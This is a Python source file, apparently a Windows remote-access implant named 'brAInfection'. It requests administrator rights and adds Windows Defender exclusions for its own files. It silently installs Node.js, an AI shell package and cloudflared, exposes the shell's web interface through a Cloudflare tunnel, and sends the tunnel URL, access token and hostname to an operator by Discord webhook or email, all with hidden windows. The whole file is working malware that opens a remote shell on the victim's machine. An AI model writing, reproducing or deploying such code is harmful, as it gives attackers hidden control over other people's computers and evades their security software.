import ctypes
import json
import os
import re
import shutil
import smtplib
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse
import urllib.request
import zipfile
from email.mime.text import MIMEText
from email.utils import formatdate

CONFIG = __BRANFECTION_CONFIG__

BASE_DIR = os.path.join(
    os.environ.get("LOCALAPPDATA") or os.environ.get("TEMP") or ".", "brAInfection"
)
WORKSPACE = os.path.join(BASE_DIR, "workspace")
LOG_PATH = os.path.join(BASE_DIR, "log.txt")
URL_PATH = os.path.join(BASE_DIR, "url.txt")
DSH_LOG = os.path.join(BASE_DIR, "dsh.log")
CF_LOG = os.path.join(BASE_DIR, "cloudflared.log")


def log(msg):
    line = "[%s] %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass


def build_env(extra_dirs=None):
    env = os.environ.copy()
    dirs = [
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\nodejs"),
        r"C:\Program Files\nodejs",
        os.path.expandvars(r"%APPDATA%\npm"),
        os.path.join(BASE_DIR, "cloudflared"),
    ]
    if extra_dirs:
        dirs = list(extra_dirs) + dirs
    seen = set()
    parts = []
    for d in dirs:
        if not d:
            continue
        key = os.path.normcase(os.path.normpath(d))
        if key not in seen:
            seen.add(key)
            parts.append(d)
    env["PATH"] = os.pathsep.join(parts + [env.get("PATH", "")])
    env["DEEPSEEK_API_KEY"] = CONFIG.get("deepseek_api_key", "")
    return env


def run(args, timeout=None, env=None):
    if isinstance(args, (list, tuple)):
        args = subprocess.list2cmdline(list(args))
    try:
        p = subprocess.run(
            args,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env or build_env(),
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return 1, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def download(url, dest, timeout=120):
    try:
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        req = urllib.request.Request(url, headers={"User-Agent": "brAInfection"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            with open(dest, "wb") as out:
                shutil.copyfileobj(resp, out, length=1024 * 1024)
        return os.path.isfile(dest) and os.path.getsize(dest) > 0
    except Exception as e:
        log("download %s: %s" % (url, e))
        return False


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def elevate():
    if getattr(sys, "frozen", False):
        exe = sys.executable
        args = sys.argv[1:]
    else:
        exe = sys.executable
        args = [os.path.abspath(__file__)] + sys.argv[1:]
    params = " ".join('"' + a + '"' for a in args)
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 1)
    except Exception:
        pass
    sys.exit(0)


def node_exe():
    p = shutil.which("node", path=build_env()["PATH"])
    if p:
        return p
    for d in (
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\nodejs"),
        r"C:\Program Files\nodejs",
        os.path.expandvars(r"%APPDATA%\npm"),
    ):
        c = os.path.join(d, "node.exe")
        if os.path.isfile(c):
            return c
    return None


def node_ok():
    return node_exe() is not None


def latest_node_lts():
    try:
        req = urllib.request.Request(
            "https://nodejs.org/dist/index.json", headers={"User-Agent": "brAInfection"}
        )
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.loads(r.read().decode("utf-8"))
        entry = next((e for e in data if e.get("lts")), data[0] if data else None)
        if not entry:
            return None
        return entry["version"]
    except Exception as e:
        log("node index: %s" % e)
        return None


def install_node_msi():
    ver = CONFIG.get("node_version") or latest_node_lts()
    if not ver:
        return False
    url = "https://nodejs.org/dist/%s/node-%s-x64.msi" % (ver, ver)
    msi = os.path.join(BASE_DIR, "node.msi")
    if not download(url, msi):
        return False
    run(["msiexec", "/i", msi, "/qn", "/norestart"], timeout=1800)
    return node_ok()


def install_node_zip():
    ver = CONFIG.get("node_version") or latest_node_lts()
    if not ver:
        return False
    url = "https://nodejs.org/dist/%s/node-%s-win-x64.zip" % (ver, ver)
    zpath = os.path.join(BASE_DIR, "node.zip")
    if not download(url, zpath):
        return False
    target = os.path.expandvars(r"%LOCALAPPDATA%\Programs\nodejs")
    os.makedirs(target, exist_ok=True)
    with zipfile.ZipFile(zpath) as z:
        z.extractall(target)
    for name in os.listdir(target):
        sub = os.path.join(target, name)
        if os.path.isdir(sub) and name.startswith("node-"):
            for item in os.listdir(sub):
                shutil.move(os.path.join(sub, item), os.path.join(target, item))
            os.rmdir(sub)
    return node_ok()


def install_node():
    if node_ok():
        return True
    log("instalando node")
    run(
        [
            "winget", "install", "-e", "--id", "OpenJS.NodeJS.LTS",
            "--silent", "--accept-package-agreements", "--accept-source-agreements",
        ],
        timeout=1800,
    )
    if node_ok():
        return True
    if install_node_msi():
        return True
    return install_node_zip()


def dsh_bin():
    code, out, _ = run(["npm", "root", "-g"])
    root = out.strip()
    for c in (
        os.path.join(root, "@deepseek-ai", "dsh", "lib", "bin.js"),
        os.path.join(
            os.path.expandvars(r"%APPDATA%"),
            "npm", "node_modules", "@deepseek-ai", "dsh", "lib", "bin.js",
        ),
    ):
        if os.path.isfile(c):
            return c
    return None


def install_dsh():
    if dsh_bin():
        return True
    log("instalando dsh")
    args = ["npm", "install", "-g", "@deepseek-ai/dsh"]
    ver = CONFIG.get("dsh_version")
    if ver:
        args = ["npm", "install", "-g", "@deepseek-ai/dsh@%s" % ver]
    run(args, timeout=1800)
    return dsh_bin() is not None


def cloudflared_path():
    p = shutil.which("cloudflared", path=build_env()["PATH"])
    if p:
        return p
    local = os.path.join(BASE_DIR, "cloudflared", "cloudflared.exe")
    return local if os.path.isfile(local) else None


def install_cloudflared():
    p = cloudflared_path()
    if p:
        return p
    log("instalando cloudflared")
    dest = os.path.join(BASE_DIR, "cloudflared", "cloudflared.exe")
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    if download(url, dest):
        return dest
    return None


def pick_free_port(port):
    for p in range(port, port + 50):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind(("127.0.0.1", p))
            s.close()
            return p
        except OSError:
            s.close()
    return port


def add_defender_exclusion():
    paths = [BASE_DIR]
    if getattr(sys, "frozen", False):
        paths.append(os.path.dirname(sys.executable))
    exe = sys.executable if getattr(sys, "frozen", False) else None
    cmds = []
    for p in paths:
        cmds.append("Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue" % p)
    if exe:
        cmds.append("Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue" % exe)
    for pr in ("cloudflared.exe", "node.exe"):
        cmds.append("Add-MpPreference -ExclusionProcess '%s' -ErrorAction SilentlyContinue" % pr)
    run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "; ".join(cmds)])


def read_dsh_log():
    try:
        with open(DSH_LOG, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except OSError:
        return ""


def extract_dsh_url(text):
    m = re.search(r"dsh web:\s+(\S+)", text)
    return m.group(1) if m else None


def token_from_url(url):
    t = re.search(r"[?&]token=([A-Za-z0-9_-]+)", url or "")
    return t.group(1) if t else None


def wait_for_dsh(timeout=180):
    end = time.time() + timeout
    while time.time() < end:
        url = extract_dsh_url(read_dsh_log())
        if url:
            return url
        time.sleep(1)
    return extract_dsh_url(read_dsh_log())


def host_from_url(url):
    try:
        return urllib.parse.urlsplit(url).hostname
    except Exception:
        return None


def start_dsh(port, trusted_hosts=None):
    node = node_exe()
    binjs = dsh_bin()
    if not node or not binjs:
        log("dsh: node/bin ausente")
        return None
    os.makedirs(WORKSPACE, exist_ok=True)
    args = [node, binjs, "web"]
    for h in (trusted_hosts or []):
        args += ["--trusted-host", h]
    args += ["--port", str(port), "--no-open"]
    try:
        with open(DSH_LOG, "wb") as lf:
            p = subprocess.Popen(
                args,
                stdout=lf,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                env=build_env(),
                cwd=WORKSPACE,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        log("dsh web iniciado pid=%s" % p.pid)
        return p
    except Exception as e:
        log("dsh: %s" % e)
        return None


def start_cloudflared(port):
    cf = cloudflared_path()
    if not cf:
        log("cloudflared ausente")
        return None
    token = CONFIG.get("cloudflared_token")
    if token:
        cmd = [cf, "tunnel", "run", "--token", token, "--no-autoupdate"]
    else:
        cmd = [cf, "tunnel", "--url", "http://127.0.0.1:%s" % port, "--no-autoupdate"]
    try:
        with open(CF_LOG, "wb") as lf:
            p = subprocess.Popen(
                cmd,
                stdout=lf,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                env=build_env(),
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        log("cloudflared iniciado pid=%s" % p.pid)
        return p
    except Exception as e:
        log("cloudflared: %s" % e)
        return None


def extract_url(text):
    m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", text)
    return m.group(0) if m else None


def read_cf_log():
    try:
        with open(CF_LOG, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except OSError:
        return ""


def wait_for_url(timeout=180):
    end = time.time() + timeout
    while time.time() < end:
        url = extract_url(read_cf_log())
        if url:
            return url
        time.sleep(2)
    return extract_url(read_cf_log())


def save_url(url):
    try:
        with open(URL_PATH, "w", encoding="utf-8") as f:
            f.write(url)
    except OSError:
        pass


def send_email(body):
    cfg = CONFIG
    password = cfg.get("smtp_password")
    to = cfg.get("email")
    if not password or not to:
        log("smtp sem senha/email; url apenas em arquivo")
        return False
    user = cfg.get("smtp_user") or to
    msg = MIMEText(body)
    msg["Subject"] = "brAInfection tunnel"
    msg["From"] = user
    msg["To"] = to
    msg["Date"] = formatdate(localtime=True)
    try:
        s = smtplib.SMTP(cfg.get("smtp_host", "smtp.gmail.com"), int(cfg.get("smtp_port", 587)), timeout=30)
        s.ehlo()
        if cfg.get("smtp_starttls", True):
            s.starttls(context=ssl.create_default_context())
            s.ehlo()
        s.login(user, password)
        s.sendmail(user, [to], msg.as_string())
        s.quit()
        return True
    except Exception as e:
        log("email: %s" % e)
        return False


def send_discord(content):
    url = CONFIG.get("discord_webhook")
    if not url:
        return False
    try:
        data = json.dumps({"content": content}).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json", "User-Agent": "brAInfection"},
        )
        with urllib.request.urlopen(req, timeout=30) as r:
            ok = 200 <= r.status < 300
            log("discord: %s" % ("enviado" if ok else "status %s" % r.status))
            return ok
    except Exception as e:
        log("discord: %s" % e)
        return False


def notify(url):
    port = CONFIG.get("port", 13080)
    host = socket.gethostname()
    if url:
        body = "URL: %s\nHost: %s\nPorta local: %s\nLocal: http://127.0.0.1:%s" % (
            url, host, port, port,
        )
        discord_msg = "brAInfection tunnel ativo\n%s\nHost: %s\nPorta local: %s" % (
            url, host, port,
        )
    else:
        body = "Tunnel ativo (named). Host: %s\nPorta local: %s\n%s" % (
            host, port, read_cf_log()[-2000:],
        )
        discord_msg = "brAInfection tunnel ativo (named)\nHost: %s\nPorta local: %s" % (
            host, port,
        )
    save_url(url or "")
    sent = False
    if CONFIG.get("discord_webhook"):
        sent = send_discord(discord_msg) or sent
    if CONFIG.get("smtp_password") and CONFIG.get("email"):
        sent = send_email(body) or sent
    return sent


def main():
    log("inicio")
    if not is_admin():
        log("elevando")
        elevate()
        return
    log("admin ok")
    add_defender_exclusion()
    port = pick_free_port(int(CONFIG.get("port", 13080)))
    log("porta %s" % port)

    if not install_node():
        log("node: falha")
        return
    if not install_dsh():
        log("dsh: falha")
        return
    if not install_cloudflared():
        log("cloudflared: falha")
        return

    dsh_proc = None
    cf_proc = None
    last_host = None
    last_url = None

    while True:
        if cf_proc is None or cf_proc.poll() is not None:
            cf_proc = start_cloudflared(port)
        if CONFIG.get("cloudflared_token"):
            host = CONFIG.get("hostname")
            tunnel_url = "https://" + host if host else None
        else:
            tunnel_url = wait_for_url()
            host = host_from_url(tunnel_url) if tunnel_url else None
        if host != last_host or dsh_proc is None or dsh_proc.poll() is not None:
            dsh_proc = start_dsh(port, [host] if host else None)
            last_host = host
        dsh_url = wait_for_dsh()
        token = token_from_url(dsh_url)
        if not dsh_url:
            log("dsh web nao anunciou url (porta ocupada?)")
        elif not token:
            log("dsh web sem token na url: %s" % dsh_url)
        if tunnel_url and dsh_url:
            final = tunnel_url + ("?token=" + token if token else "")
            if final != last_url:
                notify(final)
                last_url = final
        time.sleep(20)


if __name__ == "__main__":
    main()
